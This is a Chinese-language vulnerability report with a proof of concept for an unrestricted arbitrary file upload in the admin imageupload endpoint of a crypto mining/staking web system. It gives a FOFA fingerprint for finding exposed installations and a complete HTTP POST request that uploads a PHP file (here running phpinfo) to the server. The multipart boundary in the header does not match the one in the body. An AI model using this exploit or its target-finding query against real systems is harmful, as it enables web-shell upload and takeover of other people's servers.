# 某U挖矿质押单语言系统imageupload后台任意文件上传漏洞

位于 /admin/controller/News.php 控制器的 imageupload 方法存在一个很明显的上传文件操作file()，且无任何限制，导致漏洞产生

## fofa

```java
"/static/index/css/login/framework7.ios.min.css"
```

## poc

```javascript
POST /admin/news/imageupload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryydBYM59rmMIhj0gw
Cookie: PHPSESSID=jt6bie950imjojfm9aj6hpfl10
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/admin/news/imageupload
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: noneUpgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408281248642.webp)